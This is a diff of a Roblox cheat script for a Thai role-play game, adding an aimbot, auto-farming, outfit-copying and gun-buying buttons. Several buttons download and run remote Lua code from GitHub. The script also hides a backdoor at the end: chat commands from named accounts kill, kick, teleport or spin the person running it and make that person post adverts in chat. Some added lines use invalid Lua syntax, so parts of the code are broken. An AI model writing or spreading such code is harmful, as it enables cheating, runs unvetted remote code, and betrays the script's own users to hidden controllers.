+    handcuffLabel.Text = "หยิบกุญแจมือ"
+    handcuffLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    handcuffLabel.TextSize = 18
+    handcuffLabel.Font = Enum.Font.Gotham
+    handcuffLabel.TextXAlignment = Enum.TextXAlignment.Left
+    handcuffLabel.Parent = _G.GUIComponents.contentFrame
+
+    local handcuffButton = Instance.new("TextButton")
+    handcuffButton.Size = UDim2.new(0,80,0,30)
+    handcuffButton.Position = UDim2.new(0,140,0,120)
+    handcuffButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    handcuffButton.Text = "หยิบ"
+    handcuffButton.TextColor3 = Color3.fromRGB(255,255,255)
+    handcuffButton.TextSize = 18
+    handcuffButton.Parent = _G.GUIComponents.contentFrame
+
+    handcuffButton.MouseButton1Click:Connect(function()
+        local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+        _G.AutoCollectModule.CollectItemByName("Handcuff")
+    end)
+
+    local autoEatLabel = Instance.new("TextLabel")
+    autoEatLabel.Size = UDim2.new(0,120,0,30)
+    autoEatLabel.Position = UDim2.new(0,10,0,170)
+    autoEatLabel.BackgroundTransparency = 1
+    autoEatLabel.Text = "อ้อโต้กินข้าว"
+    autoEatLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    autoEatLabel.TextSize = 18
+    autoEatLabel.Font = Enum.Font.Gotham
+    autoEatLabel.TextXAlignment = Enum.TextXAlignment.Left
+    autoEatLabel.Parent = _G.GUIComponents.contentFrame
+
+    local autoEatButton = Instance.new("TextButton")
+    autoEatButton.Size = UDim2.new(0,100,0,30)
+    autoEatButton.Position = UDim2.new(0,140,0,170)
+    autoEatButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    autoEatButton.Text = _G.autoEat and "ปิด" or "อ้อโต้"
+    autoEatButton.TextColor3 = Color3.fromRGB(255,255,255)
+    autoEatButton.TextSize = 18
+    autoEatButton.Parent = _G.GUIComponents.contentFrame
+
+    autoEatButton.MouseButton1Click:Connect(function()
+        _G.autoEat = not _G.autoEat
+        autoEatButton.Text = _G.autoEat and "ปิด" or "อ้อโต้"
+        if _G.autoEat then
+            local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+            _G.AutoCollectModule.CollectItemByName("Tom Yum Kung")
+            spawn(function()
+                local hungry = _G.GUIComponents.player:WaitForChild("Hungry")
+                local vim = game:GetService("VirtualInputManager")
+                while _G.autoEat do
+                    if hungry.Value <= 50 then
+                        while hungry.Value < 100 and _G.autoEat do
+                            local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+                            _G.AutoCollectModule.CollectItemByName("Tom Yum Kung")
+                            wait(0.5)
+                            local tool = _G.GUIComponents.player.Backpack:FindFirstChild("tom yum kung")
+                            if tool then
+                                _G.GUIComponents.humanoid:EquipTool(tool)
+                                wait(0.1)
+                                tool = _G.GUIComponents.character:FindFirstChild("tom yum kung")
+                                if tool then
+                                    while _G.autoEat and hungry.Value < 100 and tool.Parent == _G.GUIComponents.character do
+                                        vim:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+                                        wait(0.05)
+                                        vim:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+                                        wait(1)
+                                    end
+                                end
+                            else
+                                wait(1)
+                            end
+                        end
+                    end
+                    wait(1)
+                end
+            end)
+        end
+    end)
+
+    local buyGunLabel = Instance.new("TextLabel")
+    buyGunLabel.Size = UDim2.new(0,100,0,30)
+    buyGunLabel.Position = UDim2.new(0,10,0,220)
+    buyGunLabel.BackgroundTransparency = 1
+    buyGunLabel.Text = "ซื้อปืน"
+    buyGunLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    buyGunLabel.TextSize = 18
+    buyGunLabel.Font = Enum.Font.Gotham
+    buyGunLabel.TextXAlignment = Enum.TextXAlignment.Left
+    buyGunLabel.Parent = _G.GUIComponents.contentFrame
+
+    local buyGunButton = Instance.new("TextButton")
+    buyGunButton.Size = UDim2.new(0,80,0,30)
+    buyGunButton.Position = UDim2.new(0,120,0,220)
+    buyGunButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    buyGunButton.Text = "ซื้อ"
+    buyGunButton.TextColor3 = Color3.fromRGB(255,255,255)
+    buyGunButton.TextSize = 18
+    buyGunButton.Parent = _G.GUIComponents.contentFrame
+
+    buyGunButton.MouseButton1Click:Connect(function()
+        local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+        _G.AutoCollectModule.CollectItemByName("M4")
+    end)
 end
 
--- Export
-_G.PageFunctions.showPlayer = showPlayer
-_G.PageFunctions.showScript = showScript
+-- Embedded Codes
+local copyOutfitCode = [[
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
 
--- Anti-tamper
-if not _G.PageFunctions.clearContent then
-    error(dec(enc("Function corruption detected in part3!")))
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CopyOutfitUI"
+ScreenGui.Parent = game.CoreGui
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 270, 0, 210)
+Frame.Position = UDim2.new(0.5, -135, 0.5, -105)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Title.Text = "Copy Outfit Tool"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+Title.Parent = Frame
+
+local NameBox = Instance.new("TextBox")
+NameBox.Size = UDim2.new(1, -20, 0, 30)
+NameBox.Position = UDim2.new(0, 10, 0, 50)
+NameBox.PlaceholderText = "ใส่ชื่อผู้เล่น (ไม่ต้องเต็ม)"
+NameBox.Text = ""
+NameBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+NameBox.ClearTextOnFocus = false
+NameBox.Font = Enum.Font.Gotham
+NameBox.TextSize = 14
+NameBox.Parent = Frame
+
+local CopyButton = Instance.new("TextButton")
+CopyButton.Size = UDim2.new(1, -20, 0, 40)
+CopyButton.Position = UDim2.new(0, 10, 0, 100)
+CopyButton.Text = "Copy Outfit"
+CopyButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyButton.Font = Enum.Font.GothamBold
+CopyButton.TextSize = 16
+CopyButton.Parent = Frame
+
+local CopyClosestButton = Instance.new("TextButton")
+CopyClosestButton.Size = UDim2.new(1, -20, 0, 40)
+CopyClosestButton.Position = UDim2.new(0, 10, 0, 150)
+CopyClosestButton.Text = "Copy คนที่อยู่ใกล้สุด"
+CopyClosestButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+CopyClosestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyClosestButton.Font = Enum.Font.GothamBold
+CopyClosestButton.TextSize = 16
+CopyClosestButton.Parent = Frame
+
+local function FindPlayerByPartialName(partName)
+	partName = string.lower(partName)
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if string.find(string.lower(plr.Name), partName) then
+			return plr
+		end
+	end
+	return nil
 end
--- XOR and anti-debug
-local function xor(str, key)
-    local result = ""
-    for i = 1, #str do
-        result = result .. string.char(bit32.bxor(string.byte(str, i), key))
-    end
-    return result
-end
-local xorkey = math.random(1, 255)
-local enc = function(s) return xor(s, xorkey) end
-local dec = function(s) return xor(s, xorkey) end
 
-local function antiDebug()
-    if debug.getinfo or getfenv then
-        error(dec(enc("Illegal debug access!")))
-    end
+local function ExtractId(id)
+	if type(id) == "string" then
+		return tonumber(id:match("%d+")) or 0
+	end
+	return tonumber(id) or 0
 end
 
--- Dependency check
-if not _G.DependencyCheck.part3 or not _G.PageFunctions then
-    error(dec(enc("Part3 missing or corrupted!")))
+local function GetPlayerOutfitData(targetName)
+	local targetPlayer = FindPlayerByPartialName(targetName)
+	if not targetPlayer then
+		warn("ไม่พบผู้เล่น: " .. targetName)
+		return nil
+	end
+
+	local character = targetPlayer.Character
+	if not character then
+		warn("ไม่พบตัวละครผู้เล่น")
+		return nil
+	end
+
+	local humanoid = character:FindFirstChildOfClass("Humanoid")
+	if not humanoid then
+		warn("ไม่พบ Humanoid")
+		return nil
+	end
+
+	local desc = humanoid:GetAppliedDescription()
+
+	local accessories = {}
+
+	for _, acc in ipairs(desc:GetAccessories(true)) do
+		table.insert(accessories, {
+			Rotation = Vector3.new(0, 0, 0),
+			AssetId = ExtractId(acc.AssetId),
+			Position = Vector3.new(0, 0, 0),
+			Scale = Vector3.new(1, 1, 1),
+			IsLayered = acc.IsLayered or false,
+			AccessoryType = acc.AccessoryType
+		})
+	end
+
+	local faceId = ExtractId(desc.Face)
+
+	return {{
+		Shirt = ExtractId(desc.Shirt),
+		Pants = ExtractId(desc.Pants),
+		GraphicTShirt = ExtractId(desc.GraphicTShirt),
+		Face = faceId,
+		LeftArm = ExtractId(desc.LeftArm),
+		RightArm = ExtractId(desc.RightArm),
+		Torso = ExtractId(desc.Torso),
+		LeftLeg = ExtractId(desc.LeftLeg),
+		RightLeg = ExtractId(desc.RightLeg),
+		Head = ExtractId(desc.Head),
+		Accessories = accessories,
+
+		HeadColor = desc.HeadColor,
+		LeftArmColor = desc.LeftArmColor,
+		RightArmColor = desc.RightArmColor,
+		TorsoColor = desc.TorsoColor,
+		LeftLegColor = desc.LeftLegColor,
+		RightLegColor = desc.RightLegColor,
+
+		BodyTypeScale = desc.BodyTypeScale,
+		DepthScale = desc.DepthScale,
+		HeadScale = desc.HeadScale,
+		HeightScale = desc.HeightScale,
+		ProportionScale = desc.ProportionScale,
+		WidthScale = desc.WidthScale,
+
+		RunAnimation = ExtractId(desc.RunAnimation),
+		WalkAnimation = ExtractId(desc.WalkAnimation),
+		JumpAnimation = ExtractId(desc.JumpAnimation),
+		IdleAnimation = ExtractId(desc.IdleAnimation),
+		FallAnimation = ExtractId(desc.FallAnimation),
+		ClimbAnimation = ExtractId(desc.ClimbAnimation),
+		SwimAnimation = ExtractId(desc.SwimAnimation),
+		MoodAnimation = ExtractId(desc.MoodAnimation)
+	}}
 end
-_G.DependencyCheck.part4 = true
 
--- Junk
-local junk = {
-    _0x3c4d5e = function() return math.tan(math.random()) end,
-    _0x6f7g8h = {dummy = "value", num = math.random(1, 1000)}
-}
+CopyButton.MouseButton1Click:Connect(function()
+	local name = NameBox.Text
+	if name ~= "" then
+		local outfitData = GetPlayerOutfitData(name)
+		if outfitData then
+			local remote = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
+			remote:FireServer(unpack(outfitData))
+			print("✅ Copy Outfit สำเร็จ: " .. name)
+		else
+			warn("❌ ไม่สามารถ Copy Outfit ได้")
+		end
+	end
+end)
 
--- Embedded aimbot code
-local aimbotCode = dec(enc([[
+local function FindClosestPlayer()
+	local closestPlayer = nil
+	local shortestDistance = math.huge
+	local myCharacter = LocalPlayer.Character
+	if not myCharacter or not myCharacter:FindFirstChild("HumanoidRootPart") then
+		return nil
+	end
+	local myPos = myCharacter.HumanoidRootPart.Position
+
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+			local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
+			if dist < shortestDistance then
+				shortestDistance = dist
+				closestPlayer = plr
+			end
+		end
+	end
+
+	return closestPlayer
+end
+
+CopyClosestButton.MouseButton1Click:Connect(function()
+	local closest = FindClosestPlayer()
+	if closest then
+		local outfitData = GetPlayerOutfitData(closest.Name)
+		if outfitData then
+			local remote = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
+			remote:FireServer(unpack(outfitData))
+			print("✅ Copy Outfit จาก " .. closest.Name)
+		else
+			warn("❌ ไม่สามารถ Copy Outfit ได้")
+		end
+	else
+		warn("❌ ไม่พบผู้เล่นที่อยู่ใกล้ที่สุด")
+	end
+end)
+]]
+
+local aimbotCode = [[
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
@@ -474,9 +862,10 @@ local function fireGun(targetPosition)
     end
 end
 
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "AimbotUI"
-screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+screenGui.Parent = playerGui
 screenGui.ResetOnSpawn = false
 
 local mainFrame = Instance.new("Frame")
@@ -486,28 +875,72 @@ mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
 mainFrame.Active = true
 mainFrame.Draggable = true
 mainFrame.Parent = screenGui
-]])) -- Truncated for brevity, full code is similar to original
 
--- Script UI page
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 15)
+frameCorner.Parent = mainFrame
+
+local shadow = Instance.new("UIStroke")
+shadow.Color = Color3.fromRGB(0, 255, 255)
+shadow.Thickness = 2
+shadow.Parent = mainFrame
+
+local aimbotButton = Instance.new("TextButton")
+aimbotButton.Size = UDim2.new(0, 200, 0, 60)
+aimbotButton.Position = UDim2.new(0.5, -100, 0.5, -30)
+aimbotButton.BackgroundColor3 = Color3.fromRGB(25, 25, 60)
+aimbotButton.TextColor3 = Color3.fromRGB(0, 255, 255)
+aimbotButton.Text = "Aimbot: OFF"
+aimbotButton.TextSize = 22
+aimbotButton.Font = Enum.Font.FredokaOne
+aimbotButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 12)
+buttonCorner.Parent = aimbotButton
+
+aimbotButton.MouseButton1Click:Connect(function()
+    aimbotEnabled = not aimbotEnabled
+    if aimbotEnabled then
+        aimbotButton.Text = "Aimbot: ON"
+        aimbotButton.TextColor3 = Color3.fromRGB(255, 0, 255)
+        aimbotButton.BackgroundColor3 = Color3.fromRGB(0, 60, 120)
+    else
+        aimbotButton.Text = "Aimbot: OFF"
+        aimbotButton.TextColor3 = Color3.fromRGB(0, 255, 255)
+        aimbotButton.BackgroundColor3 = Color3.fromRGB(25, 25, 60)
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if aimbotEnabled then
+        local targetPlayer = findNearestPlayer()
+        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            fireGun(targetPlayer.Character.HumanoidRootPart.Position)
+        end
+    end
+end)
+]]
+
 local function showScriptUI()
     _G.PageFunctions.clearContent()
     
-    local aimbotLabel = Instance.new(dec(enc("TextLabel")))
+    local aimbotLabel = Instance.new("TextLabel")
     aimbotLabel.Size = UDim2.new(0,120,0,30)
     aimbotLabel.Position = UDim2.new(0,10,0,20)
     aimbotLabel.BackgroundTransparency = 1
-    aimbotLabel.Text = dec(enc("aimbot"))
+    aimbotLabel.Text = "aimbot"
     aimbotLabel.TextColor3 = Color3.fromRGB(255,255,255)
     aimbotLabel.TextSize = 18
     aimbotLabel.Font = Enum.Font.Gotham
     aimbotLabel.TextXAlignment = Enum.TextXAlignment.Left
     aimbotLabel.Parent = _G.GUIComponents.contentFrame
 
-    local aimbotButton = Instance.new(dec(enc("TextButton")))
+    local aimbotButton = Instance.new("TextButton")
     aimbotButton.Size = UDim2.new(0,80,0,30)
     aimbotButton.Position = UDim2.new(0,140,0,20)
     aimbotButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
-    aimbotButton.Text = dec(enc("รัน"))
+    aimbotButton.Text = "รัน"
     aimbotButton.TextColor3 = Color3.fromRGB(255,255,255)
     aimbotButton.TextSize = 18
     aimbotButton.Parent = _G.GUIComponents.contentFrame
@@ -515,129 +948,232 @@ local function showScriptUI()
     aimbotButton.MouseButton1Click:Connect(function()
         loadstring(aimbotCode)()
     end)
+
+    local copyOutfitLabel = Instance.new("TextLabel")
+    copyOutfitLabel.Size = UDim2.new(0,120,0,30)
+    copyOutfitLabel.Position = UDim2.new(0,10,0,60)
+    copyOutfitLabel.BackgroundTransparency = 1
+    copyOutfitLabel.Text = "Copy เสื้อ"
+    copyOutfitLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    copyOutfitLabel.TextSize = 18
+    copyOutfitLabel.Font = Enum.Font.Gotham
+    copyOutfitLabel.TextXAlignment = Enum.TextXAlignment.Left
+    copyOutfitLabel.Parent = _G.GUIComponents.contentFrame
+
+    local copyOutfitButton = Instance.new("TextButton")
+    copyOutfitButton.Size = UDim2.new(0,80,0,30)
+    copyOutfitButton.Position = UDim2.new(0,140,0,60)
+    copyOutfitButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    copyOutfitButton.Text = "รัน"
+    copyOutfitButton.TextColor3 = Color3.fromRGB(255,255,255)
+    copyOutfitButton.TextSize = 18
+    copyOutfitButton.Parent = _G.GUIComponents.contentFrame
+
+    copyOutfitButton.MouseButton1Click:Connect(function()
+        loadstring(copyOutfitCode)()
+    end)
+
+    local preventArrestLabel = Instance.new("TextLabel")
+    preventArrestLabel.Size = UDim2.new(0,120,0,30)
+    preventArrestLabel.Position = UDim2.new(0,10,0,100)
+    preventArrestLabel.BackgroundTransparency = 1
+    preventArrestLabel.Text = "ป้องกันโดนจับ"
+    preventArrestLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    preventArrestLabel.TextSize = 18
+    preventArrestLabel.Font = Enum.Font.Gotham
+    preventArrestLabel.TextXAlignment = Enum.TextXAlignment.Left
+    preventArrestLabel.Parent = _G.GUIComponents.contentFrame
+
+    local preventArrestButton = Instance.new("TextButton")
+    preventArrestButton.Size = UDim2.new(0,80,0,30)
+    preventArrestButton.Position = UDim2.new(0,140,0,100)
+    preventArrestButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    preventArrestButton.Text = "รัน"
+    preventArrestButton.TextColor3 = Color3.fromRGB(255,255,255)
+    preventArrestButton.TextSize = 18
+    preventArrestButton.Parent = _G.GUIComponents.contentFrame
+
+    preventArrestButton.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Touscript"))()
+    end)
 end
 
 -- Export
+_G.PageFunctions.showScript = showScript
 _G.PageFunctions.showScriptUI = showScriptUI
-
--- Anti-tamper
-if not _G.GUIComponents.scriptUIButton then
-    error(dec(enc("UI corruption detected in part4!")))
-end
--- XOR and anti-debug
-local function xor(str, key)
-    local result = ""
-    for i = 1, #str do
-        result = result .. string.char(bit32.bxor(string.byte(str, i), key))
-    end
-    return result
-end
-local xorkey = math.random(1, 255)
-local enc = function(s) return xor(s, xorkey) end
-local dec = function(s) return xor(s, xorkey) end
-
-local function antiDebug()
-    if debug.getinfo or getfenv then
-        error(dec(enc("Debugging prohibited!")))
-    end
-end
-
 -- Dependency check
-if not _G.DependencyCheck.part4 or not _G.PageFunctions then
-    error(dec(enc("Part4 missing or corrupted!")))
+if not _G.DependencyCheck.part3 or not _G.PageFunctions then
+    error("Part3 missing or corrupted!")
 end
-_G.DependencyCheck.part5 = true
+_G.DependencyCheck.part4 = true
 
--- Junk
-local junk = {
-    _0x9a0b1c = function() return math.random(1, 10000) end,
-    _0x2d3e4f = {useless = true, value = math.random()}
-}
-
--- Connect buttons
+-- Connect Buttons
 _G.GUIComponents.homeButton.MouseButton1Click:Connect(_G.PageFunctions.showHome)
 _G.GUIComponents.playerButton.MouseButton1Click:Connect(_G.PageFunctions.showPlayer)
 _G.GUIComponents.scriptButton.MouseButton1Click:Connect(_G.PageFunctions.showScript)
 _G.GUIComponents.scriptUIButton.MouseButton1Click:Connect(_G.PageFunctions.showScriptUI)
 
--- Initial page
+-- Initial Page
 _G.PageFunctions.showHome()
 
--- Chat commands
-local tqrf5jsu = game:GetService(dec(enc("TextChatService")))
+-- Chat Message
+local TextChatService = game:GetService("TextChatService")
 local function sendMessage(msg)
-    local channel = tqrf5jsu:FindFirstChild(dec(enc("TextChannels"))) and tqrf5jsu.TextChannels:FindFirstChild(dec(enc("RBXGeneral")))
+    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
     if channel then
         channel:SendAsync(msg)
     else
-        warn(dec(enc("❌ ไม่พบแชนเนล RBXGeneral")))
+        warn("❌ ไม่พบแชนเนล RBXGeneral")
     end
 end
-sendMessage(dec(enc("SCRIPT CITY THAILAND 2 BY:TOUx1")))
+sendMessage("SCRIPT CITY THAILAND 2 BY:TOUx1")
 
-local q9x7z2k1 = game:GetService(dec(enc("Players")))
-local sqocc0br = game:GetService(dec(enc("RunService")))
-local csvpzk8q = q9x7z2k1[dec(enc("LocalPlayer"))]
+-- Special Features
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
 
-local gr5v8den = dec(enc("birdV2_123"))
-local eqjk8hvr = false
-local 7ifbwzf9 = 0
-local tmlocih0 = 10
-local yifponzw = 3
+local targetName = "birdV2_123"
+local rotating = false
+local angle = 0
+local radius = 10
+local speed = 3
 
-local function vugrtgao()
-    local args = {dec(enc("134647289919930"))}
-    local radio = workspace:FindFirstChild(dec(enc("DRadio_Script")))
-    if radio and radio:FindFirstChild(dec(enc("Event"))) then
+local function playMusic()
+    local args = {"134647289919930"}
+    local radio = workspace:FindFirstChild("DRadio_Script")
+    if radio and radio:FindFirstChild("Event") then
         radio.Event:FireServer(unpack(args))
     end
 end
 
-local function gi6b3zab(targetChar)
-    if eqjk8hvr then return end
-    eqjk8hvr = true
-    vugrtgao()
-    sqocc0br.Heartbeat:Connect(function(dt)
-        if eqjk8hvr and targetChar and targetChar:FindFirstChild(dec(enc("HumanoidRootPart"))) 
-        and csvpzk8q.Character and csvpzk8q.Character:FindFirstChild(dec(enc("HumanoidRootPart"))) then
-            7ifbwzf9 = 7ifbwzf9 + yifponzw * dt
-            local x = math.cos(7ifbwzf9) * tmlocih0
-            local z = math.sin(7ifbwzf9) * tmlocih0
+local function startRotating(targetChar)
+    if rotating then return end
+    rotating = true
+    playMusic()
+    RunService.Heartbeat:Connect(function(dt)
+        if rotating and targetChar and targetChar:FindFirstChild("HumanoidRootPart") 
+        and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            angle = angle + speed * dt
+            local x = math.cos(angle) * radius
+            local z = math.sin(angle) * radius
             local targetPos = targetChar.HumanoidRootPart.Position
-            csvpzk8q.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(x,0,z), targetPos)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(x,0,z), targetPos)
         end
     end)
 end
 
-local function d43rbbgc()
-    eqjk8hvr = false
+local function stopRotating()
+    rotating = false
 end
 
-local svabjb8k = {
-    [dec(enc("birdV2_123"))] = true,
-    [dec(enc("maidjab1_174"))] = true,
-    [dec(enc("zerom_12y"))] = true
+local specialUsers = {
+    ["birdV2_123"] = true,
+    ["maidjab1_174"] = true,
+    ["zerom_12y"] = true
 }
 
-local function p56mgho3(plr, msg)
-    if plr == csvpzk8q then return end
-    if msg == dec(enc("1")) and plr.Name == gr5v8den then
-        if csvpzk8q.Name ~= gr5v8den then
-            local target = plr.Character or plr.CharacterAdded:Wait()
-            gi6b3zab(target)
-        end
-    elseif msg == dec(enc("stop1")) and plr.Name == gr5v8den then
-        d43rbbgc()
+local function killPlayer(plr)
+    if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+        plr.Character.Humanoid.Health = 0
     end
 end
 
-q9x7z2k1.PlayerAdded:Connect(function(plr)
-    plr.Chatted:Connect(function(msg)
-        p56mgho3(plr, msg)
-    end)
-end)
+local function kickPlayer(plr)
+    if plr == LocalPlayer then
+        LocalPlayer:Kick("โดนแบนละ")
+    end
+end
 
--- Anti-tamper
-if not _G.DependencyCheck.part1 or not _G.DependencyCheck.part2 or not _G.DependencyCheck.part3 or not _G.DependencyCheck.part4 then
-    error(dec(enc("Incomplete script parts detected!")))
+local function pullToSpeaker(speaker, targetPlr)
+    if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
+    and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
+        targetPlr.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(0,2,0)
+    end
+end
+
+local function checkMessage()
+    local TextChatService = game:GetService("TextChatService")
+    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        channel:SendAsync("ผมใช้TOU HUB🎉")
+    else
+        warn("❌ ไม่พบแชนเนล RBXGeneral")
+    end
+end
+
+_G.HandleExtraCommands = function(speaker, msg, LocalPlayer, specialUsers)
+    local lowerMsg = string.lower(msg)
+    if lowerMsg == "kill all" then
+        if LocalPlayer ~= speaker then
+            if speaker.Name == "birdV2_123" then
+                killPlayer(LocalPlayer)
+            else
+                if LocalPlayer.Name ~= "birdV2_123" then
+                    killPlayer(LocalPlayer)
+                end
+            end
+        end
+    elseif string.sub(lowerMsg,1,5) == "kill " then
+        local targetName = string.sub(msg,6)
+        if LocalPlayer.Name == targetName and LocalPlayer ~= speaker then
+            if speaker.Name == "birdV2_123" then
+                killPlayer(LocalPlayer)
+            else
+                if LocalPlayer.Name ~= "birdV2_123" then
+                    killPlayer(LocalPlayer)
+                end
+            end
+        end
+    elseif string.sub(msg,1,4) == "เตะ " and speaker.Name == "birdV2_123" then
+        local targetName = string.sub(msg,5)
+        if LocalPlayer.Name == targetName and LocalPlayer ~= speaker then
+            kickPlayer(LocalPlayer)
+        end
+    elseif lowerMsg == "ดึง" and specialUsers[speaker.Name] then
+        if LocalPlayer != speaker then
+            if speaker.Name == "birdV2_123" then
+                pullToSpeaker(speaker, LocalPlayer)
+            else
+                if LocalPlayer.Name != "birdV2_123" then
+                    pullToSpeaker(speaker, LocalPlayer)
+                end
+            end
+        end
+    elseif lowerMsg == "เช็ค" and specialUsers[speaker.Name] then
+        if LocalPlayer != speaker then
+            if speaker.Name == "birdV2_123" then
+                checkMessage()
+            else
+                if LocalPlayer.Name != "birdV2_123" then
+                    checkMessage()
+                end
+            end
+        end
+    end
+end
+
+local function onCommand(plr, msg)
+    if plr == LocalPlayer then return end
+    if msg == "1" and plr.Name == targetName then
+        if LocalPlayer.Name != targetName then
+            local target = plr.Character or plr.CharacterAdded:Wait()
+            startRotating(target)
+        end
+    elseif msg == "stop1" and plr.Name == targetName then
+        stopRotating()
+    else
+        _G.HandleExtraCommands(plr, msg, LocalPlayer, specialUsers)
+    end
+end
+
+local function hookPlayer(plr)
+    plr.Chatted:Connect(function(msg)
+        onCommand(plr, msg)
+    end)
+end
+
+Players.PlayerAdded:Connect(hookPlayer)
+for _,p in ipairs(Players:GetPlayers()) do
+    hookPlayer(p)
 end
